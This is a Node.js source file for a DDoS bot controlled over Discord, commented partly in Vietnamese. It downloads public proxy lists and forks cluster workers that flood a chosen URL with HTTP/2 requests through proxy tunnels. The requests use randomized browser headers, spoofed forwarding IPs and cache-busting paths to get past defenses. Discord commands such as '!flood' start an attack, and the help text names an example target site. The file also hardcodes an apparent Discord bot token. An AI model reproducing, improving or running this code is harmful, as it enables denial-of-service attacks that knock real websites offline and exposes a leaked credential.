// ==++==
// bot.js - DDoS Bot for Render + Discord Control
// Chạy trên Render: Không cần tham số, tự động load proxy
// ==++==

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// ==================== DISCORD CONFIG ====================
const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.Gbjcnz.OTQf4MPxvnLklLbUPfeaDSvTCeJMuBxh70tfZM';  // THAY TOKEN BOT CỦA BẠN
const CHANNEL_ID = '1456595444477198508'; // THAY CHANNEL ID

// ==================== THƯ VIỆN ====================
const { Client, GatewayIntentBits } = require('discord.js');
const discordClient = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
});

const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const path = require("path");
const axios = require('axios');

// ==================== KIỂM TRA TOKEN ====================
if (TOKEN === 'you_token') {
    console.log('\x1b[31m❌ LỖI: Bạn chưa thay token bot!\x1b[0m');
    process.exit(1);
}

// ==================== BIẾN TOÀN CỤC ====================
let proxies = [];
let currentAttack = null;
let workers = [];
let totalReqs = 0;
let startTime = 0;

// ==================== TẢI PROXY TỰ ĐỘNG ====================
async function loadProxies() {
    try {
        // Thử đọc file proxy.txt trước
        if (fs.existsSync('./proxy.txt')) {
            proxies = fs.readFileSync('./proxy.txt', 'utf-8')
                .split('\n')
                .filter(line => line.trim() && line.includes(':'));
            console.log(`\x1b[32m[+] Loaded ${proxies.length} proxies from file\x1b[0m`);
            return;
        }
        
        console.log(`\x1b[33m[!] No proxy file found, downloading...\x1b[0m`);
        
        // Tải proxy từ nhiều nguồn
        const sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt'
        ];
        
        let allProxies = [];
        for (const src of sources) {
            try {
                const res = await axios.get(src, { timeout: 5000 });
                const lines = res.data.split('\n').filter(line => line.includes(':'));
                allProxies.push(...lines);
            } catch (e) {}
        }
        
        // Loại bỏ trùng lặp
        proxies = [...new Set(allProxies)];
        
        // Lưu lại để dùng lần sau
        fs.writeFileSync('./proxy.txt', proxies.join('\n'));
        
        console.log(`\x1b[32m[+] Downloaded ${proxies.length} proxies\x1b[0m`);
        
    } catch (e) {
        console.log(`\x1b[31m[!] Failed to load proxies, using direct connection\x1b[0m`);
        proxies = ['direct'];
    }
}

// ==================== TLS CONFIG ====================
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method"
});

// ==================== RANDOM ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`; }

// ==================== USER-AGENTS ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36'
];

// ==================== HEADER LISTS ====================
const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];
const encoding_header = ['gzip, deflate, br', 'gzip, deflate'];
const lang_header = ['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en-US;q=0.8'];
const cache_header = ['no-cache', 'max-age=0'];
const platform = ["Windows", "macOS", "Linux", "Android", "iOS"];
const dest_header = ['document', 'empty', 'iframe', 'image'];
const mode_header = ['navigate', 'cors', 'no-cors'];
const site_header = ['cross-site', 'same-origin', 'same-site', 'none'];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true
        });

        connection.setTimeout(3000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);
        
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) 
                callback(connection);
            else {
                connection.destroy();
                callback(null, "403");
            }
        });
        connection.on("timeout", () => {
            connection.destroy();
            callback(null, "timeout");
        });
        connection.on("error", () => {
            connection.destroy();
            callback(null, "error");
        });
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate) {
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let count = 0;
    
    setInterval(() => {
        if (count > 0 && process.send) process.send(count);
        count = 0;
    }, 1000);
    
    function flood() {
        const proxy = randomElement(proxies);
        if (proxy === 'direct') return setTimeout(flood, 100);
        
        const [ph, pp] = proxy.split(':');
        
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + '?' + randomString(8),
            ':authority': parsed.host,
            'user-agent': randomElement(uap),
            'accept': randomElement(accept_header),
            'accept-encoding': randomElement(encoding_header),
            'accept-language': randomElement(lang_header),
            'cache-control': randomElement(cache_header),
            'pragma': 'no-cache',
            'referer': 'https://www.google.com/',
            'sec-ch-ua': `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': `"${randomElement(platform)}"`,
            'x-forwarded-for': randomIP(),
            'x-real-ip': randomIP(),
            'cookie': `cf=${randomString(20)}; session=${randomString(16)}`
        };

        Socker.HTTP({ host: ph, port: parseInt(pp), address: parsed.host + ':443' }, (conn) => {
            if (!conn) return;
            
            const tlsConn = tls.connect({
                socket: conn,
                ALPNProtocols: ["h2"],
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });
            
            const client = http2.connect(parsed.href, { 
                createConnection: () => tlsConn,
                settings: { maxConcurrentStreams: 1000 }
            });
            
            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    try {
                        const req = client.request(headers);
                        req.on('error', () => {});
                        req.end();
                        count++;
                    } catch (e) {}
                }
                setTimeout(() => client.close(), 100);
            });
            
            client.on('error', () => {});
        });
        
        setImmediate(flood);
    }
    
    flood();
}

// ==================== DISCORD BOT ====================
discordClient.once('ready', () => {
    console.log(`\x1b[32m[+] Bot ${discordClient.user.tag} ready!\x1b[0m`);
    const channel = discordClient.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
╔══════════════════════════════════════════════════════╗
║     DDoS BOT - READY ON RENDER                       ║
╠══════════════════════════════════════════════════════╣
║  !flood <url> <time> <rate> <threads>                ║
║  !stop                                                ║
║  !status                                              ║
║  !help                                                ║
║  Proxy: ${proxies.length} loaded                      ║
╚══════════════════════════════════════════════════════╝
        `);
    }
});

discordClient.on('messageCreate', (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
    
    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();
    
    if (cmd === 'help') {
        msg.channel.send(`
**📚 LỆNH:**
\`!flood <url> <time> <rate> <threads>\` - VD: \`!flood https://vidushop.com 300 500 50\`
\`!stop\` - Dừng tấn công
\`!status\` - Xem trạng thái
\`!proxy\` - Xem số proxy
\`!help\` - Hướng dẫn
        `);
    }
    
    else if (cmd === 'proxy') {
        msg.channel.send(`📡 **PROXY**: ${proxies.length} proxies available`);
    }
    
    else if (cmd === 'flood') {
        if (args.length < 5) return msg.channel.send('❌ Thiếu tham số! VD: !flood https://vidushop.com 300 500 50');
        
        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);
        
        if (!target.startsWith('http')) return msg.channel.send('❌ URL phải bắt đầu bằng http');
        if (isNaN(time) || time < 10) return msg.channel.send('❌ Thời gian phải >= 10');
        if (isNaN(rate) || rate < 10) return msg.channel.send('❌ Rate phải >= 10');
        if (isNaN(threads) || threads < 1) return msg.channel.send('❌ Threads phải >= 1');
        
        // Dừng attack cũ
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
        }
        
        msg.channel.send(`
🔥 **BẮT ĐẦU TẤN CÔNG**
Target: ${target}
Time: ${time}s
Rate: ${rate}
Threads: ${threads}
Proxy: ${proxies.length}
        `);
        
        // Fork workers
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                const worker = cluster.fork();
                worker.send({ target, rate });
                workers.push(worker);
            }
            
            currentAttack = { target, time, start: Date.now() };
            totalReqs = 0;
            startTime = Date.now();
            
            cluster.on('message', (w, cnt) => totalReqs += cnt);
            
            setTimeout(() => {
                if (currentAttack) {
                    workers.forEach(w => w.kill());
                    workers = [];
                    currentAttack = null;
                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
                    msg.channel.send(`
✅ **KẾT THÚC TẤN CÔNG**
Thời gian: ${elapsed}s
Tổng requests: ${totalReqs.toLocaleString()}
RPS trung bình: ${Math.floor(totalReqs / elapsed)}
                    `);
                }
            }, time * 1000);
        }
    }
    
    else if (cmd === 'stop') {
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
            currentAttack = null;
            msg.channel.send('🛑 **ĐÃ DỪNG TẤN CÔNG**');
        } else {
            msg.channel.send('⚠️ Không có attack nào');
        }
    }
    
    else if (cmd === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - currentAttack.start) / 1000);
            const rps = Math.floor(totalReqs / (elapsed || 1));
            msg.channel.send(`
📊 **TRẠNG THÁI**
Target: ${currentAttack.target}
Thời gian: ${elapsed}s / ${currentAttack.time}s
Requests: ${totalReqs.toLocaleString()}
RPS: ${rps.toLocaleString()}
Workers: ${workers.length}
Proxy: ${proxies.length}
            `);
        } else {
            msg.channel.send('📴 Không có attack nào');
        }
    }
});

// ==================== MAIN ====================
async function main() {
    await loadProxies();
    
    if (cluster.isMaster) {
        discordClient.login(TOKEN).catch(err => {
            console.log(`\x1b[31m❌ Discord login failed: ${err.message}\x1b[0m`);
            process.exit(1);
        });
        
        console.log('\x1b[32m[+] Bot is running... Waiting for Discord commands\x1b[0m');
    } else {
        process.on('message', (data) => createWorker(data.target, data.rate));
    }
}

main();
